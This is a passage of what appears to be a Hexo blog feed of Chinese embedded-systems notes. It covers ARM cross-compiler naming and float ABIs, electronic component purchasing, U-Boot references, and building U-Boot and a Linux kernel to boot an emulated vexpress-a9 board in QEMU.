led灯（可以直观的知道一些信息），每焊接完成一个主要的芯片、模块都需要<strong>测试是否有短路、断路的问题</strong>。</li><li>在判断芯片是否有短路的现象时，通过万用表有时候是无法测出来的。所以可以通过<strong>先通电，然后看芯片是否发热来判断</strong></li></ol><p>一个可调电源的重要性<br>在绘制原理图的时候需要注意好各个芯片的设计电路是否正确、元器件的接线是否合理。<br>在绘制原理图的时候需要知道每一个元器件的作用，只有这样才可以在后面出现问题的时候知道如何解决。</p><h1 id="其他需改进的地方"><a href="#其他需改进的地方" class="headerlink" title="其他需改进的地方"></a>其他需改进的地方</h1><ol><li>没有在排母附近添加上引脚的钢印，使得各个引脚的作用不清楚</li><li>最小系统板：<ol><li>时钟</li><li>调试、下载接口</li><li>启动模式</li><li>复位电路</li><li>电源</li></ol></li><li>各个电路引脚没有使用滤波电容</li></ol>]]></content>
    
    
    <categories>
      
      <category>项目</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Uboot学习</title>
    <link href="/2024/05/20/Uboot%E5%AD%A6%E4%B9%A0/"/>
    <url>/2024/05/20/Uboot%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p>关于 U-boot 的一些学习笔记。</p><span id="more"></span><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li><a href="https://blog.csdn.net/nature_07/article/details/128607903">qemu使用uboot通过网络加载 linux kernel</a></li><li><a href="https://blog.csdn.net/linuxweiyh/article/details/82658924">uboot如何启动内核</a></li><li><a href="https://mshrimp.github.io/2020/04/19/u-boot%E5%BC%95%E5%AF%BCkernel%E5%90%AF%E5%8A%A8%E8%BF%87%E7%A8%8B/">u-boot引导kernel启动过程</a></li><li></li></ul>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>arm交叉编译器gnueabi、none-eabi、arm-eabi、gnueabihf、gnueabi区别</title>
    <link href="/2024/05/16/arm%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91%E5%99%A8gnueabi%E3%80%81none-eabi%E3%80%81arm-eabi%E3%80%81gnueabihf%E3%80%81gnueabi%E5%8C%BA%E5%88%AB/"/>
    <url>/2024/05/16/arm%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91%E5%99%A8gnueabi%E3%80%81none-eabi%E3%80%81arm-eabi%E3%80%81gnueabihf%E3%80%81gnueabi%E5%8C%BA%E5%88%AB/</url>
    
    <content type="html"><![CDATA[<h1 id="命名规则"><a href="#命名规则" class="headerlink" title="命名规则"></a>命名规则</h1><p>交叉编译工具链的命名规则为：arch [-vendor] [-os] [-(gnu)eabi]</p><ul><li>arch - 体系架构，如ARM，MIPS</li><li>vendor - 工具链提供商</li><li>os - 目标操作系统</li><li>eabi - 嵌入式应用二进制接口（Embedded Application Binary Interface）</li></ul><p>根据对操作系统的支持与否，ARM GCC可分为支持和不支持操作系统，如</p><ul><li>arm-none-eabi：这个是没有操作系统的，自然不可能支持那些跟操作系统关系密切的函数，比如fork(2)。他使用的是newlib这个专用于嵌入式系统的C库。</li><li>arm-none-linux-eabi：用于Linux的，使用Glibc</li></ul><p> </p><h1 id="1、arm-none-eabi-gcc"><a href="#1、arm-none-eabi-gcc" class="headerlink" title="1、arm-none-eabi-gcc"></a>1、arm-none-eabi-gcc</h1><p>（ARM architecture，no vendor，not target an operating system，complies with the ARM EABI）<br>用于编译 ARM 架构的裸机系统（包括 ARM Linux 的 boot、kernel，不适用编译 Linux 应用 Application），一般适合 ARM7、Cortex-M 和 Cortex-R 内核的芯片使用，所以不支持那些跟操作系统关系密切的函数，比如fork(2)，他使用的是 newlib 这个专用于嵌入式系统的C库。</p><h1 id="2、arm-none-linux-gnueabi-gcc"><a href="#2、arm-none-linux-gnueabi-gcc" class="headerlink" title="2、arm-none-linux-gnueabi-gcc"></a>2、arm-none-linux-gnueabi-gcc</h1><p>(ARM architecture, no vendor, creates binaries that run on the Linux operating system, and uses the GNU EABI)</p><p>主要用于基于ARM架构的Linux系统，可用于编译 ARM 架构的 u-boot、Linux内核、linux应用等。arm-none-linux-gnueabi基于GCC，使用Glibc库，经过 Codesourcery 公司优化过推出的编译器。arm-none-linux-gnueabi-xxx 交叉编译工具的浮点运算非常优秀。一般ARM9、ARM11、Cortex-A 内核，带有 Linux 操作系统的会用到。</p><h1 id="3、arm-eabi-gcc"><a href="#3、arm-eabi-gcc" class="headerlink" title="3、arm-eabi-gcc"></a>3、arm-eabi-gcc</h1><p>Android ARM 编译器。</p><h1 id="4、armcc"><a href="#4、armcc" class="headerlink" title="4、armcc"></a>4、armcc</h1><p>ARM 公司推出的编译工具，功能和 arm-none-eabi 类似，可以编译裸机程序（u-boot、kernel），但是不能编译 Linux 应用程序。armcc一般和ARM开发工具一起，Keil MDK、ADS、RVDS和DS-5中的编译器都是armcc，所以 armcc 编译器都是收费的（爱国版除外，呵呵~~）。</p><h1 id="5、arm-none-uclinuxeabi-gcc-和-arm-none-symbianelf-gcc"><a href="#5、arm-none-uclinuxeabi-gcc-和-arm-none-symbianelf-gcc" class="headerlink" title="5、arm-none-uclinuxeabi-gcc 和 arm-none-symbianelf-gcc"></a>5、arm-none-uclinuxeabi-gcc 和 arm-none-symbianelf-gcc</h1><p>arm-none-uclinuxeabi 用于uCLinux，使用Glibc。</p><p>arm-none-symbianelf 用于symbian，没用过，不知道C库是什么 。</p><h1 id="Codesourcery"><a href="#Codesourcery" class="headerlink" title="Codesourcery"></a>Codesourcery</h1><p>Codesourcery推出的产品叫Sourcery G++ Lite Edition，其中基于command-line的编译器是免费的，在官网上可以下载，而其中包含的IDE和debug 工具是收费的，当然也有30天试用版本的。</p><p>目前CodeSourcery已经由明导国际(Mentor Graphics)收购，所以原本的网站风格已经全部变为 Mentor 样式，但是 Sourcery G++ Lite Edition 同样可以注册后免费下载。</p><p>Codesourcery一直是在做ARM目标 GCC 的开发和优化，它的ARM GCC在目前在市场上非常优秀，很多 patch 可能还没被gcc接受，所以还是应该直接用它的（而且他提供Windows下[mingw交叉编译的]和Linux下的二进制版本，比较方便；如果不是很有时间和兴趣，不建议下载 src 源码包自己编译，很麻烦，Codesourcery给的shell脚本很多时候根本没办法直接用，得自行提取关键的部分手工执行，又费精力又费时间，如果想知道细节，其实不用自己编译一遍，看看他是用什么步骤构建的即可，如果你对交叉编译器感兴趣的话。</p><h1 id="ABI和EABI"><a href="#ABI和EABI" class="headerlink" title="ABI和EABI"></a>ABI和EABI</h1><p>ABI：二进制应用程序接口(Application Binary Interface (ABI) for the ARM Architecture)。在计算机中，应用二进制接口描述了应用程序（或者其他类型）和操作系统之间或其他应用程序的低级接口。</p><p>EABI：嵌入式ABI。嵌入式应用二进制接口指定了文件格式、数据类型、寄存器使用、堆积组织优化和在一个嵌入式软件中的参数的标准约定。开发者使用自己的汇编语言也可以使用 EABI 作为与兼容的编译器生成的汇编语言的接口。</p><p>两者主要区别是，ABI是计算机上的，EABI是嵌入式平台上（如ARM，MIPS等）。</p><h1 id="arm-linux-gnueabi-gcc-和-arm-linux-gnueabihf-gcc"><a href="#arm-linux-gnueabi-gcc-和-arm-linux-gnueabihf-gcc" class="headerlink" title="arm-linux-gnueabi-gcc 和 arm-linux-gnueabihf-gcc"></a>arm-linux-gnueabi-gcc 和 arm-linux-gnueabihf-gcc</h1><p>两个交叉编译器分别适用于 armel 和 armhf 两个不同的架构，armel 和 armhf 这两种架构在对待浮点运算采取了不同的策略（有 fpu 的 arm 才能支持这两种浮点运算策略）。</p><p>其实这两个交叉编译器只不过是 gcc 的选项 -mfloat-abi 的默认值不同。gcc 的选项 -mfloat-abi 有三种值 soft、softfp、hard（其中后两者都要求 arm 里有 fpu 浮点运算单元，soft 与后两者是兼容的，但 softfp 和 hard 两种模式互不兼容）：  </p><ul><li>soft： 不用fpu进行浮点计算，即使有fpu浮点运算单元也不用，而是使用软件模式。  </li><li>softfp： armel架构（对应的编译器为 arm-linux-gnueabi-gcc ）采用的默认值，用fpu计算，但是传参数用普通寄存器传，这样中断的时候，只需要保存普通寄存器，中断负荷小，但是参数需要转换成浮点的再计算。  </li><li>hard： armhf架构（对应的编译器 arm-linux-gnueabihf-gcc ）采用的默认值，用fpu计算，传参数也用fpu中的浮点寄存器传，省去了转换，性能最好，但是中断负荷高。</li></ul><p>把以下测试使用的C文件内容保存成 mfloat.c：  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span>  </span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>  <br>&#123;  <br>    <span class="hljs-type">double</span> a,b,c;  <br>    a = <span class="hljs-number">23.543</span>;  <br>    b = <span class="hljs-number">323.234</span>;  <br>    c = b/a;  <br>    <span class="hljs-built_in">printf</span>(“the <span class="hljs-number">13</span>/<span class="hljs-number">2</span> = %f\\n”, c);  <br>    <span class="hljs-built_in">printf</span>(“hello world !\\n”);  <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  <br>&#125;<br></code></pre></td></tr></table></figure><ol><li><p>使用 arm-linux-gnueabihf-gcc 编译，使用“-v”选项以获取更详细的信息：<br># arm-linux-gnueabihf-gcc -v mfloat.c<br>COLLECT_GCC_OPTIONS&#x3D;’-v’ ‘-march&#x3D;armv7-a’ ‘-mfloat-abi&#x3D;hard’ ‘-mfpu&#x3D;vfpv3-d16′ ‘-mthumb’<br>-mfloat-abi&#x3D;hard</p><p> 可看出使用hard硬件浮点模式。</p></li><li><p>使用 arm-linux-gnueabi-gcc 编译：<br># arm-linux-gnueabi-gcc -v mfloat.c<br>COLLECT_GCC_OPTIONS&#x3D;’-v’ ‘-march&#x3D;armv7-a’ ‘-mfloat-abi&#x3D;softfp’ ‘-mfpu&#x3D;vfpv3-d16′ ‘-mthumb’<br>-mfloat-abi&#x3D;softfp</p><p> 可看出使用softfp模式。</p></li></ol><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li><a href="https://www.cnblogs.com/guojun-junguo/p/10477455.html#_label0">https://www.cnblogs.com/guojun-junguo/p/10477455.html#_label0</a></li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>记相机项目硬件采购上遇到的问题</title>
    <link href="/2024/05/15/%E8%AE%B0%E7%9B%B8%E6%9C%BA%E9%A1%B9%E7%9B%AE%E7%A1%AC%E4%BB%B6%E9%87%87%E8%B4%AD%E4%B8%8A%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/"/>
    <url>/2024/05/15/%E8%AE%B0%E7%9B%B8%E6%9C%BA%E9%A1%B9%E7%9B%AE%E7%A1%AC%E4%BB%B6%E9%87%87%E8%B4%AD%E4%B8%8A%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h1 id="二极管相关采购"><a href="#二极管相关采购" class="headerlink" title="二极管相关采购"></a>二极管相关采购</h1><p>对于二极管来说主要关注一下参数：</p><ul><li><p>尺寸大小，一般来说这个是一定需要知道的。特别是这个和焊盘上的大小是密切相关的。如果二者不一致的话，就无法使用了。<strong>我们可以首先在 嘉立创 上面选择好需要的元器件，然后根据我们在嘉立创上选择的元器件再去淘宝上购买，这样可以剩下一些运费钱（在淘宝上搜索后可以选择 免运费 就可以搜索不需要运费的店铺了</strong>。在淘宝上面购买的话，需要主要下面这些参数的实现：（其实看元器件的 型号规则 嘉立创上列出的参数即可）</p><ul><li>对于肖特基二极管来说<br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202405151814375.png">。<br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202405151815453.png"><br>我们去淘宝上面买的时候可以直接搜索 <code>SS54SMC</code> 实际上，这个名称和其<strong>封装、大小</strong>是密切相关的。</li><li>对于电解电容来说<br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202405151817185.png"></li></ul></li><li><p>注意是否是<strong>贴片元件</strong>，这个一般不会看错。因为看图片就知道了。但是仍然需要注意。</p></li><li><p>还有非常重要的一点是<strong>封装格式</strong>，不同的封装会导致不一样的焊盘大小。比如对于 <code>0806</code> 的封装来说其焊盘的大小是要小于 <code>0603</code> 的封装的。</p></li></ul><h1 id="关于连接器的采购"><a href="#关于连接器的采购" class="headerlink" title="关于连接器的采购"></a>关于连接器的采购</h1><h1 id="电阻、电容、电感的采购问题"><a href="#电阻、电容、电感的采购问题" class="headerlink" title="电阻、电容、电感的采购问题"></a>电阻、电容、电感的采购问题</h1><p>对于这些常用的元器件，采购主要是看下面这些参数，注意不同的元器件需要查看的参数是不一样的，但是这些参数基本上都是通用的，也有共同点。</p><h2 id="电阻"><a href="#电阻" class="headerlink" title="电阻"></a>电阻</h2><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202406161556020.png"></p><p>上面这个图中主要参数为：</p><ul><li><code>402</code>：封装，这个需要根据 pcb 上的焊盘大小来判断，常见的封装有：<code>0603</code>、<code>0805</code>、<code>0402</code>等等</li><li><code>1K</code>：阻值，这个不用多说了</li><li><code>1%</code>：精度，这个一般也不用多说</li><li><code>1/16W</code>，额定工作功率</li></ul><p>关于电阻的采购我们就只需要确定好这些参数即可。</p><h2 id="电容"><a href="#电容" class="headerlink" title="电容"></a>电容</h2><ul><li>封装，同样的和电阻一致具有上面哪些封装大小</li><li>电阻值，这个电容具有的阻值</li><li>精度，这个电容的精度</li><li>额定电压：这个电容可以通过的最大电压，使用电压必须要小于这个电压。</li><li>电容值</li></ul><h2 id="电感"><a href="#电感" class="headerlink" title="电感"></a>电感</h2><ul><li>封装，同样的和电阻一致具有上面哪些封装大小，需要注意电感有一个电阻、电容的封装——SMD。具体使用什是样的封装需要根据 pcb 板上面的焊盘来判断。</li><li>电感值</li><li>精度</li><li>额定电流 </li><li>电阻值，比如说 <code>2R2</code> 表示这个这个电感的阻值是 <code>2.2</code>欧姆。</li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>使用qemu模拟一块开发板</title>
    <link href="/2024/05/11/%E4%BD%BF%E7%94%A8qemu%E6%A8%A1%E6%8B%9F%E4%B8%80%E5%9D%97%E5%BC%80%E5%8F%91%E6%9D%BF/"/>
    <url>/2024/05/11/%E4%BD%BF%E7%94%A8qemu%E6%A8%A1%E6%8B%9F%E4%B8%80%E5%9D%97%E5%BC%80%E5%8F%91%E6%9D%BF/</url>
    
    <content type="html"><![CDATA[<p>如何使用 QEMU 模拟一块开发板？</p><span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>事实上，qemu可以用来模拟各种硬件，并且 <code>qemu</code> 官方也提供了一些已经配置好的硬件开发板。所以，我们可以直接使用这些配置好的开发板来进行模拟。<strong>同时也可以自己配置自己的独特的开发板</strong>。</p><p>首先，我们先说如何使用 <code>qemu</code> 官方提供的配置好的开发板。</p><h1 id="关于QEMU的杂项"><a href="#关于QEMU的杂项" class="headerlink" title="关于QEMU的杂项"></a>关于QEMU的杂项</h1><h2 id="qemu-qemu-kvm-qemu-system-x86-64-qemu-x86-64命令的区别"><a href="#qemu-qemu-kvm-qemu-system-x86-64-qemu-x86-64命令的区别" class="headerlink" title="qemu&#x2F;qemu-kvm&#x2F;qemu-system-x86_64&#x2F;qemu-x86_64命令的区别"></a>qemu&#x2F;qemu-kvm&#x2F;qemu-system-x86_64&#x2F;qemu-x86_64命令的区别</h2><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p>在老版本中有单独的qemu-kvm模块存在，结合qemu一起做虚拟机工作。在后续新版本中，已经将qemu-kvm模块完全合并到qemu中去。因此当需要使用kvm特性时候，只需要qemu-system-x86_64 启动命令中增加参数 –enable-kvm参数使能即可。</p><ul><li>(<a href="http://blog.csdn.net/tantexian/article/details/41281171">http://blog.csdn.net/tantexian/article/details/41281171</a>)</li></ul><h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><blockquote><p>I asked the mailing list, here’s what I got:</p><p>qemu-arch like &#x2F;usr&#x2F;local&#x2F;bin&#x2F;qemu-x86_64 is for running a program of that arch on the host machine of what ever arch, but not a virtual machine<br>qemu-system-arch like &#x2F;usr&#x2F;local&#x2F;bin&#x2F;qemu-system-x86_64 is for running a system of that arch on the host machine to enable kvm support, qemu parameter -enable-kvm is needed, libvirt should have taken care of this if right xml is configured</p><p>Thanks Jakob for the answer in the mailing list.</p></blockquote><ul><li>(<a href="http://serverfault.com/questions/767212/difference-between-qemu-kvm-qemu-system-x86-64-qemu-x86-64">http://serverfault.com/questions/767212/difference-between-qemu-kvm-qemu-system-x86-64-qemu-x86-64</a>)</li></ul><p>意思是，类似qemu-x86_64这种命令是运行某种架构的程序的，qemu-system-x86_64是运行某种架构系统的（虚拟机），如果需要kvm支持，需要加上参数 -enable-kvm， 如果使用libvirt可以配置相应的xml来实现kvm支持。</p><h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><blockquote><p>Actually, qemu-kvm is a simple wrapper of qemu-system-x86_64.</p><p>In my x86_64 gentoo OS, the content of qemu-kvm script is</p><p>#!&#x2F;bin&#x2F;sh$ exec &#x2F;usr&#x2F;bin&#x2F;qemu-system-x86_64 –enable-kvm “$@”</p></blockquote><ul><li>(<a href="https://lists.nongnu.org/archive/html/qemu-discuss/2012-02/msg00018.html">https://lists.nongnu.org/archive/html/qemu-discuss/2012-02/msg00018.html</a>)</li></ul><p>意思是，gentoo里面的qemu-kvm就是运行“qemu-system-x86_64 –enable-kvm”， 是一个脚本。</p><h3 id="4"><a href="#4" class="headerlink" title="4"></a>4</h3><blockquote><p>The KVM project used to maintain a fork of QEMU called qemu-kvm. All feature differences have been merged into QEMU upstream and the development of the fork suspended.</p><p>To use KVM pass –enable-kvm to QEMU.</p></blockquote><ul><li>(<a href="http://wiki.qemu.org/Features/KVM">http://wiki.qemu.org/Features/KVM</a>)</li></ul><p>官方文档，意思是KVM项目以前fork了一个QEMU的镜像并称为qemu-kvm。现在所有不同的特征都被merge到QEMU的upstream了，称为qemu-kvm的fork版本暂停开发了。</p><h3 id="暂时的结论"><a href="#暂时的结论" class="headerlink" title="暂时的结论"></a>暂时的结论</h3><p>现在的qemu已经整合qemu-kvm，不再有qemu-kvm的说法了。一般创建x86的虚拟机需要用到qemu-system-x86_64这个命令，并需要加上–enable-kvm来支持kvm加速。有些Linux发行版的qemu-kvm命令仅仅是qemu-system-x86_64的软链接或者简单包装。</p><ul><li><a href="https://blog.jcix.top/2016-11-02/qemu_commands/">https://blog.jcix.top/2016-11-02/qemu_commands/</a></li></ul><h1 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h1><p><strong>首先，不管是编译什么软件，在 Linux 中都需要使用编译器等等一系列的工具，我们称之为工具链。由于我们需要编译不同于我们 PC 架构的软件，所以需要安装交叉编译器。</strong></p><p>安装各种架构的工具链是一件麻烦事，但是好在有一些开源的工具可以帮助我们安装。</p><p>我们首先了解一下相关工具的命令规则：</p><p>GCC 的命名规则为：<strong>arch [-vendor] [-os] [-(gnu)eabi]-gcc</strong></p><p>比如 <code>arm-linux-gnueabi-gcc</code> ， <code>arm-none-eabi-gcc</code>， <code>aarch64-linux-gnu-gcc</code></p><p><strong>带 [] 的是可选部分。</strong></p><ul><li><p>arch：芯片架构，比如 32 位的 Arm 架构对应的 arch 为 arm，64 位的 Arm 架构对应的 arch 为 aarch64。</p></li><li><p>vendor ：工具链提供商，大部分工具链名字里面都没有包含这部分。</p></li><li><p>os ：编译出来的可执行文件(目标文件)针对的操作系统，比如 Linux。</p></li></ul><p>其中 <code>arm-none-eabi-gcc</code> 一般适用用于 <code>Arm Cortex-M/Cortex-R</code> 平台，它使用的是 <code>newlib</code> 库。</p><p><code>arm-linux-gnueabi-gcc</code> 和 <code>aarch64-linux-gnu-gcc</code> 适用于 <code>Arm Cortex-A</code> 系列芯片，前者针对 <code>32</code> 位芯片，后者针对 <code>64</code> 位芯片，它使用的是 <code>glibc</code> 库。可以用来编译 u-boot、linux kernel 以及应用程序。</p><p>另外需要补充一点的是，<code>32</code> 位的 Arm 和 <code>64</code> 位的 Arm，它们的指令集是不同的，所以需要使用不同的工具链。当然，<code>Arm64</code> 为了保证前向兼容，提供了一个 <code>32</code> 位的兼容模式，所以我们用 <code>arm-linux-gnueabi-gcc</code> 编译的应用程序也是可以直接在Arm64 的系统上运行的，但是 <code>Linux Kernel</code> 和 <code>U-Boot</code> 就不行，除非你提前把 <code>CPU</code> 切换到 <code>32</code> 位模式。曾经有个项目使用了一颗四核的 Arm64 芯片，但是内存只有64M，为了节省空间，在 CPU 运行到 <code>U-Boot</code> 之前，我们就把它切到了 32 位模式，后面的 <code>U-Boot</code>、<code>Linux Kernel</code>，应用全部都用 <code>32</code> 位编译，加上 <code>Thumb</code> 指令集，节省了不少空间。</p><h2 id="ARM平台"><a href="#ARM平台" class="headerlink" title="ARM平台"></a>ARM平台</h2><p>现在 Arm 平台上用的最广泛的工具链是 Linaro 发布的，大家可以到 Linaro 官网下载，地址如下：</p><p>在这个平台上，可以使用 <a href="https://www.linaro.org/downloads/">linaro</a> 提供的工具链。</p><p>同时，我们也可以不使用这个工具链，自己编译工具链。</p><h3 id="安装交叉编译器"><a href="#安装交叉编译器" class="headerlink" title="安装交叉编译器"></a>安装交叉编译器</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt-get install gcc-arm-linux-gnueabi<br></code></pre></td></tr></table></figure><p>如果想要卸载：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt-get remove gcc-arm-linux-gnueabi<br></code></pre></td></tr></table></figure><p>如果提示缺少相对应的安装库则：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt-get install build-essential pkg-config zlib1g-dev libglib2.0-0 libglib2.0-dev  libsdl1.2-dev libpixman-1-dev libfdt-dev autoconf automake libtool librbd-dev libaio-dev flex bison -y<br></code></pre></td></tr></table></figure><h1 id="使用官方的配置开发板"><a href="#使用官方的配置开发板" class="headerlink" title="使用官方的配置开发板"></a>使用官方的配置开发板</h1><p>qemu 官方是提供了一些已经配置好的开发板，我们可以直接使用这些配置好的开发板来进行模拟。<strong>但是， qemu 也支持自定义的开发板，我们可以自己配置自己的独特的开发板。这个部分我们之后再说</strong>。</p><p>使用命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">qemu-system-arm -M ?<br></code></pre></td></tr></table></figure><p>这个查看所有支持的开发板。</p><h2 id="准备好qemu"><a href="#准备好qemu" class="headerlink" title="准备好qemu"></a>准备好qemu</h2><p>首先，我们需要安装 <code>qemu</code> 软件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt-get install qemu-system-arm<br></code></pre></td></tr></table></figure><h2 id="准备好引导文件——Uboot"><a href="#准备好引导文件——Uboot" class="headerlink" title="准备好引导文件——Uboot"></a>准备好引导文件——Uboot</h2><p><strong>需要注意的是，如果直接使用 qemu 运行 Linux 的话其实是不需要 uboot 的的。这是因为其实 qemu 自带了一个引导程序，可以直接引导 Linux 内核</strong>。也就是说，如果直接使用 qemu 运行 Linux，我们不需要安装 <code>u-boot</code>。也是可以执行的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">qemu-system-arm \<br>-M vexpress-a9 \<br>-m 512M \<br>-kernel /path_to_kernel_dir/arch/arm/boot/zImage -dtb  \<br>/path_to_kernel_dir/arch/arm/boot/dts/vexpress-v2p-ca9.dtb \<br>-nographic \<br>-append <span class="hljs-string">&quot;root=/dev/mmcblk0  console=ttyAMA0&quot;</span> \<br>-sd a9rootfs.ext3<br></code></pre></td></tr></table></figure><p><strong>从上面这个命令中可以看出来，这里是直接使用 <code>zImage</code> 作为内核，而不是使用的 <code>uImage</code>作为内核。</strong></p><p><strong>如果是直接再电脑上使用 qemu 来运行 Linux，我们可以不用安装 uboot 。但是，对于嵌入式环境下，我们还是需要安装 <code>u-boot</code> 的。因为qemu自带bootloader功能，可以直接引导内核，有点类似于自带BIOS系统的电脑主板。但是嵌入式设备通常是没有这样的条件的，所以我们如果真的要用QEMU完成仿真工作的话，还是得把u-boot加进来。</strong></p><p>一般来说，我们使用 <code>u-boot</code> 作为引导程序，使用 <code>u-boot</code> 引导 <code>linux</code> 内核的时候是需要内核的。<code>uboot</code> 的作用主要是引导，引导 kernel、rootfs 等等。</p><p>首先从官方网站下载 <code>u-boot</code> 软件包，然后解压：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> git@github.com:u-boot/u-boot.gitc<br><br>tar -xvf u-boot-2021.04.tar.bz2<br></code></pre></td></tr></table></figure><p>然后进行配置：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> u-boot-2021.04<br>make CROSS_COMPILE=arm-linux-gnueabi- ARCH=arm vexpress_ca9x4_defconfig<br><span class="hljs-comment"># 这个由于官方已经提供了相关开发板的默认配置，就不再需要更改了，指定官方已经写好的配置。</span><br></code></pre></td></tr></table></figure><p>编译：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">make CROSS_COMPILE=arm-linux-gnueabi- ARCH=arm -j8make vexpress_ca9x4_defconfig<br></code></pre></td></tr></table></figure><p>编译完毕之后，在当前目录下会生成<code>u-boot</code>文件，这个文件可以使用以下命令启动：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo qemu-system-arm -M vexpress-a9 -m 256 -kernel ./u-boot -nographic<br><span class="hljs-comment"># -nographic 不使用图形化界面，仅仅使用串口</span><br></code></pre></td></tr></table></figure><p><strong>这里在准备好 uboot 之后，我们可以使用 qemu 进行测试</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">qemu-system-arm \<br>-M vexpress-a9 \<br>-m 512M \<br>-kernel /path_to_uboot/u-boot \<br>-nographic \<br></code></pre></td></tr></table></figure><div class="note note-info">            <p>这里可以使用 qemu 来研究 uboot 的启动流程，可以帮助我们理解 uboot 的工作原理。</p>          </div><p>此时由于缺少 <code>linux</code> 内核，所以无法启动系统，我们需要准备好 <code>linux</code> 内核。</p><h2 id="准备好内核——Linux-Kernel"><a href="#准备好内核——Linux-Kernel" class="headerlink" title="准备好内核——Linux Kernel"></a>准备好内核——Linux Kernel</h2><p>首先我们再 <code>GitHub</code> 上下载 <code>linux</code> 内核源码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> git@github.com:torvalds/linux.git<br></code></pre></td></tr></table></figure><p>配置、编译：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 解压</span><br>tar xf linux-5.10.tar.xz<br><span class="hljs-built_in">cd</span>  linux-5.10<br><span class="hljs-comment"># 配置，要指定ARCH=arm（也可以设置环境变量），才会从arm架构中找配置文件，这里注意Linux内核已经帮我们编写好了一些配置文件，可以去 /arch 下的文件夹中找。注意 arm 和 arm64 是不同的，一个是 32 位 一个是 64 位。</span><br>make ARCH=arm  vexpress_defconfig<br><span class="hljs-comment"># 编译，可以使用参数zImage,modules,dtbs编译指定的部分，默认全部编译</span><br>make CROSS_COMPILE=arm-linux-gnueabi- ARCH=arm -j8<br><span class="hljs-comment"># 生成的文件位于arch/arm/boot下</span><br></code></pre></td></tr></table></figure><p><strong>由于我们使用 Uboot 进行引导，所以需要 uImage 作为内核，而不是 zImage</strong>。所以需要将 Linux 内核修改为 uImage 格式。二者有什么区别：** uImage 是带有 长度为 0x40 长的信息头的内核镜像，而 zImage 是没有信息头的内核镜像**。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">make zImage -j8 <span class="hljs-comment">#注意，由于 uImage 是由 zImage 来生成的</span><br>make uImage 